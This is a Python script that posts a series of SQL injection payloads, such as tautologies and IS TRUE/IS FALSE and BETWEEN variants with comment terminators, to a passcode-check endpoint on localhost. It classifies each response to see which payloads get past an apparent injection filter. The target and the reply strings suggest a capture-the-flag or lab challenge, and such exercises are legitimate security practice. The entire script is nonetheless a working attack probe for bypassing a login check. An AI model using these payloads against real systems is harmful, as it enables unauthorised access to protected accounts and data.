import urllib.request, urllib.parse

URL = "http://127.0.0.1:44576/check_code"

def send(pay):
    data = urllib.parse.urlencode({"passcode": pay}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(URL, data=data), timeout=5)
        return r.read().decode().strip()
    except:
        return "ERR"

tests = [
    ("' alone", "'"),
    ("1' --", "1' -- "),
    ("1' OR 1=1", "1' OR 1=1 -- "),
    ("1' OR 0", "1' OR 0 -- "),
    ("1' OR 1=2", "1' OR 1=2 -- "),
    ("1' AND 1", "1' AND 1 -- "),
    ("1' IS NOT FALSE", "1' IS NOT FALSE -- "),
    ("1' IS TRUE", "1' IS TRUE -- "),
    ("1' IS FALSE", "1' IS FALSE -- "),
    ("1' BETWEEN 0 AND 1", "1' BETWEEN 0 AND 1 -- "),
]

for desc, pay in tests:
    r = send(pay)
    if "CHEATING" in r:
        status = "CHEATING"
    elif "Injection" in r:
        status = "INJECTION"
    elif "NO NO" in r:
        status = "NO_MATCH"
    elif r == "":
        status = "SQL_ERR"
    elif "script" in r:
        status = "PASS_REQ"
    else:
        status = r[:20]
    print(f"{desc:30s} -> {status}")